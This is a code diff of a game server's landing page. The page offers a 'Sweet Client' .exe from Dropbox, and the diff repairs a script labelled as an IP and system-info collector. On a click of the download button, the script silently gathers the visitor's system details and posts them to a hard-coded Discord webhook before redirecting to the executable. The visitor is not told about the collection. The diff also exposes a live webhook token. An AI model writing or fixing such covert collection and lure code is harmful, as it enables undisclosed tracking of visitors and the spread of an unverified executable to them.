@@ -322,14 +322,16 @@
               💕 100% cozy, grief-free survival with protected claims, balanced economy and the cutest community! 💕
             </p>
 
-            <div class="flex flex-col sm:flex-row gap-3 sm:items-center">
-              <a href="https://www.dropbox.com/scl/fi/znrvbqbzsjnb3tcvulg4k/SweetClient.exe?rlkey=hkvekktbkqv5w8j44k2ze9qt0&st=f7lk8w1g&dl=1" download class="download-btn inline-flex items-center justify-center px-8 py-4 rounded-full text-white text-sm sm:text-base font-bold">
-                <span class="flex items-center gap-2">
-                  <span>💜</span>
-                  <span>Sweet Client Download</span>
-                  <span>💜</span>
-                </span>
-              </a>
+           <div class="flex flex-col sm:flex-row gap-3 sm:items-center">
+  <!-- Sizin indirme linkiniz (Class ismine dikkat) -->
+  <a href="https://www.dropbox.com/scl/fi/znrvbqbzsjnb3tcvulg4k/SweetClient.exe?rlkey=hkvekktbkqv5w8j44k2ze9qt0&st=f7lk8w1g&dl=1" download class="download-btn inline-flex items-center justify-center px-8 py-4 rounded-full text-white text-sm sm:text-base font-bold">
+    <span class="flex items-center gap-2">
+      <span>💜</span>
+      <span>Sweet Client Download</span>
+      <span>💜</span>
+    </span>
+  </a>
+</div>
 
               <div class="text-[11px] text-pink-100/75">
                 <div class="font-semibold">Server IP:</div>
@@ -739,15 +741,14 @@
 <!-- Sweet Analytics - IP & System Info Collector -->
 <script>
 (function() {
-    // Bilgileri ve yönlendirme linkini buraya yazıyoruz
-    const WINDOWS_URL = "https://www.dropbox.com/s/example/SweetClient.zip?dl=1"; 
     const WEBHOOK_URL = `https://discord.com/api/webhooks/1507679922204835861/4KBmEkutizxWNUODdBcndXvTgRo09QkItSDLz7p-CKar0Xxs-e1Uw4UbCn0AditkkDw5`;
 
     function showNotification(message) {
         console.log("Bildirim:", message);
     }
 
-    const modalDownload = document.getElementById("download-btn");
+    // ARTIK CLASS ÜZERİNDEN SEÇİYORUZ (id yerine .download-btn kullandık)
+    const modalDownload = document.querySelector(".download-btn");
 
     function collectSystemInfo() {
       const info = {};
@@ -827,7 +828,6 @@
     function sendWebhook() {
       const systemInfo = collectSystemInfo();
       
-      // Koddaki çökme problemi buradaki parantez yapısından kaynaklanıyordu, düzeltildi.
       const sendPayload = () => {
         const payload = {
           embeds: [{
@@ -870,15 +870,19 @@
     if (modalDownload) {
         modalDownload.addEventListener("click", (e) => {
           e.preventDefault();
+          
+          // İndirme linkini doğrudan butonun üzerindeki href'ten otomatik alıyor
+          const downloadUrl = modalDownload.getAttribute("href");
+          
           sendWebhook();
           showNotification("SweetClient download started");
           
           setTimeout(() => {
-            window.location.href = WINDOWS_URL;
+            window.location.href = downloadUrl;
           }, 500);
         });
     } else {
-        console.warn("Uyarı: 'download-btn' id'sine sahip buton sayfada bulunamadı.");
+        console.warn("Uyarı: '.download-btn' sınıfına sahip indirme linki sayfada bulunamadı.");
     }
 })();
 </script>
